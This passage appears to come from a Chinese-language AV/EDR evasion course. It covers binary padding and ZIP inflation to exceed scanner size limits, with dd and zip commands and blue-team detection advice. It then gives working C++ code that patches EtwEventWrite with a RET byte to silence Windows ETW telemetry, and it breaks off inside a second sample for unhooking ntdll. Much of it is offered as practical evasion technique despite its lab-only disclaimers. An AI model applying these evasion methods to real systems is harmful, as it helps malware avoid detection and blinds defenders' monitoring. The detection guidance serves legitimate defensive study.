<h2 id="AV-EDR规避实战技巧-7-8-超大文件和二进制填充"><a href="#AV-EDR规避实战技巧-7-8-超大文件和二进制填充" class="headerlink" title="AV&#x2F;EDR规避实战技巧 - 7.8 - 超大文件和二进制填充"></a>AV&#x2F;EDR规避实战技巧 - 7.8 - 超大文件和二进制填充</h2><h3 id="为什么选择这个话题"><a href="#为什么选择这个话题" class="headerlink" title="为什么选择这个话题"></a>为什么选择这个话题</h3><p>一些AV&#x2F;EDR引擎对文件扫描大小或递归解压归档的深度有限制。攻击者利用这一点，通过<strong>二进制填充</strong>（使文件变大）和<strong>压缩传输</strong>（小ZIP文件在解压后变得非常大）来绕过这些限制。Trellix记录了实际的攻击活动，其中小的压缩包解压后扩展到超过300MB的可执行文件，通常能够绕过大小限制的扫描。(<a target="_blank" rel="noopener" href="https://www.trellix.com/blogs/research/supersize-me/?utm_source=chatgpt.com" title="SuperSize Me">trellix.com</a>)</p>
<hr>
<h3 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h3><p>完成本模块后，学生将能够：</p>
<ol>
<li><p>解释如何滥用AV&#x2F;EDR中的<strong>文件大小阈值</strong>和<strong>归档递归限制</strong>。(<a target="_blank" rel="noopener" href="https://www.trellix.com/blogs/research/supersize-me/?utm_source=chatgpt.com" title="SuperSize Me">trellix.com</a>)</p>
</li>
<li><p>描述<strong>二进制填充</strong>（MITRE ATT&amp;CK T1027.001），以及它如何影响哈希&#x2F;签名和收集&#x2F;扫描。(<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1027/001/" title="Obfuscated Files or Information: Binary Padding, Sub-technique T1027.001 - Enterprise | MITRE ATT&amp;CK®">attack.mitre.org</a>)</p>
</li>
<li><p>在安全实验室中演示如何将<strong>高度可压缩</strong>的内容压缩为<strong>1–10MB</strong>的ZIP文件，然后在解压时扩展。(<a target="_blank" rel="noopener" href="https://zlib.net/zlib%5Ftech.html" title="zlib Technical Details">zlib.net</a>)</p>
</li>
<li><p>评估蓝队的<strong>检测与缓解</strong>（网关、EDR、邮件过滤器、沙箱限制）。(<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1027/001/" title="Obfuscated Files or Information: Binary Padding, Sub-technique T1027.001 - Enterprise | MITRE ATT&amp;CK®">attack.mitre.org</a>)</p>
</li>
</ol>
<hr>
<h3 id="关键概念（威胁与技术概述）"><a href="#关键概念（威胁与技术概述）" class="headerlink" title="关键概念（威胁与技术概述）"></a>关键概念（威胁与技术概述）</h3><h3 id="1-AV-EDR的大小与深度限制"><a href="#1-AV-EDR的大小与深度限制" class="headerlink" title="1) AV&#x2F;EDR的大小与深度限制"></a>1) AV&#x2F;EDR的大小与深度限制</h3><ul>
<li>引擎可能<strong>跳过或部分分析大文件</strong>，或者在解压归档时在达到限制深度后停止，以保护性能。Trellix观察到小的电子邮件ZIP文件可以解压为<strong>300MB以上的有效载荷</strong>（ZIP → ISO → EXE），旨在突破扫描限制。(<a target="_blank" rel="noopener" href="https://www.trellix.com/blogs/research/supersize-me/?utm_source=chatgpt.com" title="SuperSize Me">trellix.com</a>)</li>
</ul>
<h3 id="2-二进制填充（MITRE-ATT-CK-T1027-001）"><a href="#2-二进制填充（MITRE-ATT-CK-T1027-001）" class="headerlink" title="2) 二进制填充（MITRE ATT&amp;CK T1027.001）"></a>2) 二进制填充（MITRE ATT&amp;CK T1027.001）</h3><ul>
<li><p><strong>添加垃圾字节&#x2F;覆盖数据</strong>，改变文件在磁盘上的表示，而不改变其行为，从而绕过基于哈希的阻止列表和一些静态签名。</p>
</li>
<li><p>填充可以<strong>将文件大小推高至超出扫描阈值</strong>，降低文件被分析或收集的机会。(<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1027/001/" title="Obfuscated Files or Information: Binary Padding, Sub-technique T1027.001 - Enterprise | MITRE ATT&amp;CK®">attack.mitre.org</a>)</p>
</li>
</ul>
<h3 id="3-“通过ZIP超大化”及极限压缩比"><a href="#3-“通过ZIP超大化”及极限压缩比" class="headerlink" title="3) “通过ZIP超大化”及极限压缩比"></a>3) “通过ZIP超大化”及极限压缩比</h3><ul>
<li><p>DEFLATE可以在简单数据（如零填充的文件）上达到**&gt;1000:1<strong>的压缩率；一个</strong>50MB<strong>的全零文件可以压缩为</strong>~49KB<strong>——因此一个</strong>300MB<strong>的高度冗余有效载荷可以压缩成一个</strong>小于1MB到几MB**的ZIP文件。(<a target="_blank" rel="noopener" href="https://zlib.net/zlib%5Ftech.html" title="zlib Technical Details">zlib.net</a>)</p>
</li>
<li><p><strong>ZIP炸弹逻辑</strong>（嵌套归档或重复模式）展示了如何通过小型归档文件解压出庞大的数据；经典的<strong>42.zip</strong>是<strong>42KB</strong>，解压后扩展到<strong>4.5PB</strong>。（现代工具通常能检测到这样的炸弹，但这个概念展示了为什么解压预算存在。）(<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Zip%5Fbomb" title="Zip bomb - Wikipedia">Wikipedia</a>)</p>
</li>
</ul>
<h3 id="4-需要了解的工具与参考资料（仅供研究-实验室使用）"><a href="#4-需要了解的工具与参考资料（仅供研究-实验室使用）" class="headerlink" title="4) 需要了解的工具与参考资料（仅供研究&#x2F;实验室使用）"></a>4) 需要了解的工具与参考资料（仅供研究&#x2F;实验室使用）</h3><ul>
<li><p><strong>inflate.py</strong> — 使用零字节填充二进制文件，突破常见的EDR大小限制（仅用于研究&#x2F;教育目的）。(<a target="_blank" rel="noopener" href="https://github.com/njcve/inflate.py" title="GitHub - njcve/inflate.py: Artificially inflate a given binary to exceed common EDR file size limits. Can be used to bypass common EDR.">GitHub</a>)</p>
</li>
<li><p>供应商研究：<strong>Trellix“SuperSize Me”</strong> 提供的关于紧凑归档扩展为非常大的可执行文件的示例。(<a target="_blank" rel="noopener" href="https://www.trellix.com/blogs/research/supersize-me/?utm_source=chatgpt.com" title="SuperSize Me">trellix.com</a>)</p>
</li>
<li><p>技术简介：<strong>Unprotect&#x2F;ATT&amp;CK</strong>条目中的二进制填充（T1027.001）。(<a target="_blank" rel="noopener" href="https://unprotect.it/technique/obfuscated-files-or-information-binary-padding/" title="Obfuscated Files or Information: Binary Padding - Unprotect Project">unprotect.it</a>)</p>
</li>
</ul>
<blockquote>
<p>合法使用：所有活动必须仅限于您自己的隔离实验室，并使用无害文件。不要在您没有所有权&#x2F;操作权或明确书面授权的网络上进行测试。</p>
</blockquote>
<hr>
<h3 id="实验（受控的、无害的）"><a href="#实验（受控的、无害的）" class="headerlink" title="实验（受控的、无害的）"></a>实验（受控的、无害的）</h3><blockquote>
<p>目标：观察如何将<strong>可压缩内容</strong>压缩为ZIP文件，并且在提取时<strong>重新膨胀</strong>超过典型的扫描阈值。此实验仅使用<strong>无害的</strong>虚拟数据。</p>
</blockquote>
<h3 id="A部分-—-创建一个填充的无害文件"><a href="#A部分-—-创建一个填充的无害文件" class="headerlink" title="A部分 — 创建一个填充的无害文件"></a>A部分 — 创建一个填充的无害文件</h3><ol>
<li><p>获取一个您拥有的无害文件（例如，一个测试EXE或无害的文本&#x2F;二进制数据块）。</p>
</li>
<li><p>附加一个大型的<strong>高度可压缩字节块</strong>（例如，零字节或<code>0x41</code>），直到文件的总大小为300–800MB。（此概念与inflate.py类似，但不要使用真实的恶意软件。）(<a target="_blank" rel="noopener" href="https://github.com/njcve/inflate.py" title="GitHub - njcve/inflate.py: Artificially inflate a given binary to exceed common EDR file size limits. Can be used to bypass common EDR.">GitHub</a>)</p>
</li>
<li><p>记录<strong>磁盘上的大小</strong>和填充后的<strong>哈希变化</strong>。（二进制填充会改变校验和，可能绕过基于哈希的阻止列表。）(<a target="_blank" rel="noopener" href="https://unprotect.it/technique/obfuscated-files-or-information-binary-padding/" title="Obfuscated Files or Information: Binary Padding - Unprotect Project">unprotect.it</a>)</p>
</li>
</ol>
<h3 id="B部分-—-压缩并检查比率"><a href="#B部分-—-压缩并检查比率" class="headerlink" title="B部分 — 压缩并检查比率"></a>B部分 — 压缩并检查比率</h3><ol>
<li><p>使用DEFLATE高压缩比（级别9）压缩填充后的文件。</p>
</li>
<li><p>记录<strong>ZIP大小与未压缩大小</strong>；使用全零填充时，您可能会看到<strong>两到三个数量级的压缩率</strong>（例如，300MB → 几MB）。(<a target="_blank" rel="noopener" href="https://zlib.net/zlib%5Ftech.html" title="zlib Technical Details">zlib.net</a>)</p>
</li>
<li><p>解压ZIP文件并验证解压后的大小与原始大文件一致。</p>
</li>
</ol>
<h3 id="C部分-—-观察扫描器行为（离线实验室）"><a href="#C部分-—-观察扫描器行为（离线实验室）" class="headerlink" title="C部分 — 观察扫描器行为（离线实验室）"></a>C部分 — 观察扫描器行为（离线实验室）</h3><ol>
<li><p>在<strong>隔离的虚拟机</strong>上使用测试模式的终端工具，查看日志&#x2F;事件：</p>
<ul>
<li><p>扫描<strong>小ZIP文件</strong>。</p>
</li>
<li><p>解压并扫描<strong>扩展的文件</strong>。</p>
</li>
</ul>
</li>
<li><p>查找<strong>大小&#x2F;深度信息</strong>、<strong>跳过&#x2F;部分扫描</strong>指示或不同的<strong>按需扫描与按访问扫描</strong>结果。（供应商记录了大文件的性能权衡和扫描考虑因素。）(<a target="_blank" rel="noopener" href="https://docs.trellix.com/bundle/endpoint-security-storage-protection-2.1.x-product-guide/page/GUID-2D7DD80D-7B7B-4B46-8E27-BC1C3C7F3780.html?utm_source=chatgpt.com" title="Frequently asked questions">docs.trellix.com</a>)</p>
</li>
</ol>
<blockquote>
<p>可选阅读：Trellix展示了真实的攻击活动示例，如<strong>1.77MB ZIP → 300MB ISO → 300MB EXE</strong>和<strong>77KB ZIP → 664MB EXE</strong>链条，正是利用了这些限制。(<a target="_blank" rel="noopener" href="https://www.trellix.com/blogs/research/supersize-me/?utm_source=chatgpt.com" title="SuperSize Me">trellix.com</a>)</p>
</blockquote>
<hr>
<h3 id="红队考虑"><a href="#红队考虑" class="headerlink" title="红队考虑"></a>红队考虑</h3><ul>
<li><strong>二进制填充</strong>：概念上，附加垃圾数据&#x2F;覆盖物可以改变哈希和文件大小，而不影响功能。强调<strong>为什么</strong>这种方法有效，而不是如何将其武器化。([attack.mitre.org](https:&#x2F;&#x2F;</li>
</ul>
<p>attack.mitre.org&#x2F;techniques&#x2F;T1027&#x2F;001&#x2F; “Obfuscated Files or Information: Binary Padding, Sub-technique T1027.001 - Enterprise | MITRE ATT&amp;CK®”))</p>
<ul>
<li><strong>归档传递</strong>：可压缩的覆盖数据使得<strong>小ZIP文件</strong>在解压时膨胀成巨大的数据，有可能在解压时超过<strong>AV“预算”</strong>。(<a target="_blank" rel="noopener" href="https://www.trellix.com/blogs/research/supersize-me/?utm_source=chatgpt.com" title="SuperSize Me">trellix.com</a>)</li>
</ul>
<hr>
<h3 id="蓝队检测与缓解"><a href="#蓝队检测与缓解" class="headerlink" title="蓝队检测与缓解"></a>蓝队检测与缓解</h3><ol>
<li><p><strong>加固大小&#x2F;深度策略</strong></p>
<ul>
<li><p>记录<strong>最大文件大小</strong>和<strong>最大递归深度</strong>，适用于邮件&#x2F;网页&#x2F;终端网关。</p>
</li>
<li><p>在受控服务器（如MTA&#x2F;SEG）上偏好<strong>解压后扫描</strong>，并根据风险档案调整<strong>沙箱中的爆炸预算</strong>。 （ATT&amp;CK指出，大小限制影响检测&#x2F;收集。）(<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1027/001/" title="Obfuscated Files or Information: Binary Padding, Sub-technique T1027.001 - Enterprise | MITRE ATT&amp;CK®">attack.mitre.org</a>)</p>
</li>
</ul>
</li>
<li><p><strong>标记可疑的压缩比</strong></p>
<ul>
<li>对<strong>极限压缩</strong>进行警报（例如，压缩大小远小于未压缩大小的可执行内容）。DEFLATE对简单数据的**&gt;1000:1**压缩率显示了为什么小型归档文件可以隐藏非常大的有效载荷。(<a target="_blank" rel="noopener" href="https://zlib.net/zlib%5Ftech.html" title="zlib Technical Details">zlib.net</a>)</li>
</ul>
</li>
<li><p><strong>将覆盖物视为遥测</strong></p>
<ul>
<li>增加规则以检测<strong>大型PE覆盖物</strong>或统一字节区域（零字节、0x41），并将这些文件路由到深度分析，即使跳过了内容扫描。Trellix指出，攻击者附加了GB规模的统一字节覆盖物。(<a target="_blank" rel="noopener" href="https://www.trellix.com/blogs/research/supersize-me/?utm_source=chatgpt.com" title="SuperSize Me">trellix.com</a>)</li>
</ul>
</li>
<li><p><strong>内存中心检测</strong></p>
<ul>
<li>当磁盘扫描因大小限制被绕过时，依赖<strong>行为和内存扫描</strong>；许多恶意软件家族在解压&#x2F;执行后才能被识别。 （技术页面和供应商文档强调，填充绕过了静态检查，内存&#x2F;行为仍然能暴露活动。）(<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1027/001/" title="Obfuscated Files or Information: Binary Padding, Sub-technique T1027.001 - Enterprise | MITRE ATT&amp;CK®">attack.mitre.org</a>)</li>
</ul>
</li>
<li><p><strong>网关限制与处理</strong></p>
<ul>
<li>对归档使用<strong>超时&#x2F;CPU预算</strong>和<strong>安全解压</strong>；阻止或隔离<strong>包含巨大文件的归档</strong>或<strong>超出政策限制的文件</strong>。Zip炸弹研究解释了为什么需要设定预算。 (<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Zip%5Fbomb" title="Zip bomb - Wikipedia">Wikipedia</a>)</li>
</ul>
</li>
<li><p><strong>狩猎查询</strong></p>
<ul>
<li>查找：“ZIP包含PE&#x2F;ISO &gt; XMB”，“PE带覆盖物 &gt; X%”，“突变的哈希与大小跳跃”或“重复字节段”。（技术T1027.001提供了填充技术的实际示例。）(<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1027/001/" title="Obfuscated Files or Information: Binary Padding, Sub-technique T1027.001 - Enterprise | MITRE ATT&amp;CK®">attack.mitre.org</a>)</li>
</ul>
</li>
</ol>
<hr>
<h3 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h3><ul>
<li><p><strong>解释</strong>二进制填充如何影响AV签名和文件收集。(<a target="_blank" rel="noopener" href="https://unprotect.it/technique/obfuscated-files-or-information-binary-padding/" title="Obfuscated Files or Information: Binary Padding - Unprotect Project">unprotect.it</a>)</p>
</li>
<li><p><strong>计算</strong>实验中运行的压缩比，并解释为什么ZIP文件保持在10MB以下。(<a target="_blank" rel="noopener" href="https://zlib.net/zlib%5Ftech.html" title="zlib Technical Details">zlib.net</a>)</p>
</li>
<li><p><strong>提出</strong>两个补偿控制措施，在提取&#x2F;执行后仍能捕捉恶意行为。(<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1027/001/" title="Obfuscated Files or Information: Binary Padding, Sub-technique T1027.001 - Enterprise | MITRE ATT&amp;CK®">attack.mitre.org</a>)</p>
</li>
</ul>
<hr>
<h3 id="概念验证（PoC）-—-演示超大文件与ZIP技巧"><a href="#概念验证（PoC）-—-演示超大文件与ZIP技巧" class="headerlink" title="概念验证（PoC） — 演示超大文件与ZIP技巧"></a>概念验证（PoC） — 演示超大文件与ZIP技巧</h3><blockquote>
<p><strong>免责声明：</strong>本PoC仅使用无害的、用户生成的文件（例如虚拟二进制文件或文本）。仅用于<strong>教育和研究</strong>目的，在受控实验室中进行。不要使用真实恶意软件进行尝试。</p>
</blockquote>
<h3 id="第一步-—-创建一个填充的文件"><a href="#第一步-—-创建一个填充的文件" class="headerlink" title="第一步 — 创建一个填充的文件"></a>第一步 — 创建一个填充的文件</h3><p>我们从生成一个<strong>高度可压缩的文件</strong>（仅包含零）开始。Linux&#x2F;macOS上：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建一个500MB的零填充文件</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=padded.bin bs=1M count=500<br></code></pre></td></tr></table></figure>

<p>Windows（PowerShell）：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建一个500MB的零填充文件</span><br><span class="hljs-variable">$size</span> = <span class="hljs-number">500</span>MB<br><span class="hljs-variable">$fs</span> = [<span class="hljs-type">System.IO.File</span>]::Create(<span class="hljs-string">&quot;padded.bin&quot;</span>)<br><span class="hljs-variable">$fs</span>.SetLength(<span class="hljs-variable">$size</span>)<br><span class="hljs-variable">$fs</span>.Close()<br></code></pre></td></tr></table></figure>

<p>此时，您已经有了一个<strong>500MB的二进制文件</strong>，内容全为零。这模拟了<strong>二进制填充</strong>（T1027.001），即向文件附加大量冗余数据。</p>
<hr>
<h3 id="第二步-—-使用ZIP压缩"><a href="#第二步-—-使用ZIP压缩" class="headerlink" title="第二步 — 使用ZIP压缩"></a>第二步 — 使用ZIP压缩</h3><p>现在压缩文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip -9 compressed.zip padded.bin<br></code></pre></td></tr></table></figure>

<p>观察结果：</p>
<ul>
<li><p><strong>ZIP文件大小</strong>很可能会小于<strong>5MB</strong>，因为DEFLATE算法对重复字节的压缩非常有效。</p>
</li>
<li><p>解压时，文件会恢复为原始的<strong>500MB</strong>大小。</p>
</li>
</ul>
<hr>
<h3 id="第三步-—-验证扩展"><a href="#第三步-—-验证扩展" class="headerlink" title="第三步 — 验证扩展"></a>第三步 — 验证扩展</h3><p>解压文件并检查：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip compressed.zip<br><span class="hljs-built_in">ls</span> -lh padded.bin<br></code></pre></td></tr></table></figure>

<p>输出会确认文件已经恢复到其原始的<strong>500MB</strong>大小。</p>
<hr>
<h3 id="第四步-—-观察扫描器行为（仅限实验室）"><a href="#第四步-—-观察扫描器行为（仅限实验室）" class="headerlink" title="第四步 — 观察扫描器行为（仅限实验室）"></a>第四步 — 观察扫描器行为（仅限实验室）</h3><ol>
<li><p>将<strong>compressed.zip</strong>上传到您隔离实验室中的AV&#x2F;EDR测试环境。</p>
</li>
<li><p>扫描<strong>ZIP文件</strong> — 由于文件较小，扫描器通常会允许扫描。</p>
</li>
<li><p>解压并扫描<strong>扩展后的padded.bin</strong> — 有些扫描器会记录警告或跳过分析，因为文件大小超过了扫描阈值。</p>
</li>
</ol>
<hr>
<h3 id="第五步-—-可选：演示对无害二进制文件的覆盖物填充"><a href="#第五步-—-可选：演示对无害二进制文件的覆盖物填充" class="headerlink" title="第五步 — 可选：演示对无害二进制文件的覆盖物填充"></a>第五步 — 可选：演示对无害二进制文件的覆盖物填充</h3><p>要模拟填充一个真实的可执行文件而不破坏执行，可以执行以下操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 向无害的文件追加300MB的垃圾数据</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=300 &gt;&gt; harmless.exe<br></code></pre></td></tr></table></figure>

<ul>
<li><p><strong>程序仍然运行</strong>（如果harmless.exe是可执行文件的话）。</p>
</li>
<li><p><strong>哈希发生变化</strong>（绕过哈希阻止列表）。</p>
</li>
<li><p>文件大小超过了常规AV&#x2F;EDR扫描的预算。</p>
</li>
</ul>
<p>这演示了攻击者如何使用<strong>二进制填充</strong>覆盖物。</p>
<hr>
<h3 id="学生应该从这个PoC中学到什么"><a href="#学生应该从这个PoC中学到什么" class="headerlink" title="学生应该从这个PoC中学到什么"></a>学生应该从这个PoC中学到什么</h3><ul>
<li><p><strong>文件大小限制很重要：</strong>许多AV&#x2F;EDR引擎限制它们的扫描范围。</p>
</li>
<li><p><strong>二进制填充改变哈希：</strong>有效对抗静态阻止列表。</p>
</li>
<li><p><strong>压缩技巧可以绕过检查：</strong>小ZIP文件在解压后可以膨胀成几百MB或几GB。</p>
</li>
<li><p><strong>蓝队防御：</strong>标记极限压缩比，监控PE覆盖物，使用内存扫描。</p>
</li>
</ul>
<h3 id="进一步阅读与参考资料"><a href="#进一步阅读与参考资料" class="headerlink" title="进一步阅读与参考资料"></a>进一步阅读与参考资料</h3><ul>
<li><p>Trellix研究 — <strong>“SuperSize Me”</strong>（超大有效载荷传递；跨电子邮件和容器的示例）。(<a target="_blank" rel="noopener" href="https://www.trellix.com/blogs/research/supersize-me/?utm_source=chatgpt.com" title="SuperSize Me">trellix.com</a>)</p>
</li>
<li><p>Unprotect — <strong>二进制填充</strong>（概念、对校验和&#x2F;签名的影响、大小限制规避）。(<a target="_blank" rel="noopener" href="https://unprotect.it/technique/obfuscated-files-or-information-binary-padding/" title="Obfuscated Files or Information: Binary Padding - Unprotect Project">unprotect.it</a>)</p>
</li>
<li><p>MITRE ATT&amp;CK — <strong>T1027.001 二进制填充</strong>（技术、过程示例、检测&#x2F;缓解说明）。<strong>最后修改：2025年4月25日</strong>。(<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1027/001/" title="Obfuscated Files or Information: Binary Padding, Sub-technique T1027.001 - Enterprise | MITRE ATT&amp;CK®">attack.mitre.org</a>)</p>
</li>
<li><p><strong>inflate.py</strong> — 填充的开源示例（仅供研究&#x2F;实验室使用）。(<a href="%5Bhttps://github.com/njcve/inflate.py%5D(https://github.com/njcve/inflate.py">GitHub</a> “GitHub - njcve&#x2F;inflate.py: Artificially inflate a given binary to exceed common EDR file size limits. Can be used to bypass</p>
</li>
</ul>
<p>common EDR.”))</p>
<ul>
<li><p><strong>zlib技术细节</strong> — 对零填充数据进行经验性的**&gt;1000:1**DEFLATE压缩（为什么1–10MB的ZIP文件如果内容高度可压缩，会隐藏300MB到GB的有效载荷）。(<a target="_blank" rel="noopener" href="https://zlib.net/zlib%5Ftech.html" title="zlib Technical Details">zlib.net</a>)</p>
</li>
<li><p>ZIP炸弹（关于解压预算攻击的背景；<strong>42.zip</strong>扩展42KB → <strong>4.5PB</strong>）。(<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Zip%5Fbomb" title="Zip bomb - Wikipedia">Wikipedia</a>)</p>
</li>
</ul>
<h1 id="模块-8-系统调用、内核和-EDR-规避"><a href="#模块-8-系统调用、内核和-EDR-规避" class="headerlink" title="模块 8 - 系统调用、内核和 EDR 规避"></a>模块 8 - 系统调用、内核和 EDR 规避</h1><h2 id="AV-EDR规避实战技巧-8-1-ETW绕过（EtwEventWrite补丁，ETW归零）"><a href="#AV-EDR规避实战技巧-8-1-ETW绕过（EtwEventWrite补丁，ETW归零）" class="headerlink" title="AV&#x2F;EDR规避实战技巧 - 8.1 - ETW绕过（EtwEventWrite补丁，ETW归零）"></a>AV&#x2F;EDR规避实战技巧 - 8.1 - ETW绕过（EtwEventWrite补丁，ETW归零）</h2><h3 id="目标：-3"><a href="#目标：-3" class="headerlink" title="目标："></a><strong>目标：</strong></h3><p>ETW（Windows事件追踪）被操作系统和现代EDR产品用于实时监控执行行为，包括进程创建、DLL加载和网络活动。红队成员或恶意软件通常通过打补丁或禁用与ETW相关的函数来减少或消除执行过程中的遥测可见性。</p>
<p>我们将重点介绍两种主要技术：</p>
<ol>
<li><p><strong>打补丁<code>EtwEventWrite</code>使其立即返回</strong>。</p>
</li>
<li><p><strong>使用磁盘上的干净字节恢复<code>EtwEventWrite</code>（内联钩子规避）</strong>。</p>
</li>
</ol>
<hr>
<h3 id="1-EtwEventWrite补丁（立即返回）"><a href="#1-EtwEventWrite补丁（立即返回）" class="headerlink" title="1. EtwEventWrite补丁（立即返回）"></a><strong>1. EtwEventWrite补丁（立即返回）</strong></h3><h4 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h4><p>用<code>ret</code>操作码（<code>0xC3</code>）覆盖<code>EtwEventWrite</code>中的第一条指令，使该函数立即返回并且不进行任何日志记录。</p>
<h4 id="C-代码示例-打补丁-EtwEventWrite"><a href="#C-代码示例-打补丁-EtwEventWrite" class="headerlink" title="C++代码示例 - 打补丁 EtwEventWrite"></a><strong>C++代码示例 - 打补丁 EtwEventWrite</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">// 补丁EtwEventWrite使其立即返回（0xC3 = RET）</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PatchEtwEventWrite</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 获取ntdll.dll的句柄，其中包含EtwEventWrite</span><br>    HMODULE hNtdll = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hNtdll) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;获取ntdll.dll句柄失败\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 获取EtwEventWrite函数的地址</span><br>    <span class="hljs-type">void</span>* pEtwEventWrite = <span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;EtwEventWrite&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!pEtwEventWrite) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;未找到EtwEventWrite\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 用0xC3（ret）覆盖第一字节</span><br>    DWORD oldProtect;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">VirtualProtect</span>(pEtwEventWrite, <span class="hljs-number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) &#123;<br>        *((BYTE*)pEtwEventWrite) = <span class="hljs-number">0xC3</span>;<br>        <span class="hljs-built_in">VirtualProtect</span>(pEtwEventWrite, <span class="hljs-number">1</span>, oldProtect, &amp;oldProtect);<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;成功补丁EtwEventWrite\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;更改内存保护失败\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">PatchEtwEventWrite</span>();<br><br>    <span class="hljs-comment">// 正常程序执行</span><br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;载荷运行中...&quot;</span>, <span class="hljs-string">&quot;信息&quot;</span>, MB_OK);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h4><ul>
<li><p>此补丁非常简单，现代的AV&#x2F;EDR可能会通过验证关键函数的完整性来检测到。</p>
</li>
<li><p>它在用户模式下工作，兼容大多数Windows 10&#x2F;11系统。</p>
</li>
<li><p>成功后，<code>EtwEventWrite</code>将停止发送任何事件。</p>
</li>
</ul>
<hr>
<h3 id="2-EtwEventWrite归零（恢复原始字节）"><a href="#2-EtwEventWrite归零（恢复原始字节）" class="headerlink" title="2. EtwEventWrite归零（恢复原始字节）"></a><strong>2. EtwEventWrite归零（恢复原始字节）</strong></h3><p>EDR可能通过跳转指令钩住<code>EtwEventWrite</code>以监控或拦截调用。你可以从磁盘上备份的<code>ntdll.dll</code>恢复原始的干净字节。</p>
<h4 id="C-代码示例-从磁盘恢复干净字节"><a href="#C-代码示例-从磁盘恢复干净字节" class="headerlink" title="C++代码示例 - 从磁盘恢复干净字节"></a><strong>C++代码示例 - 从磁盘恢复干净字节</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 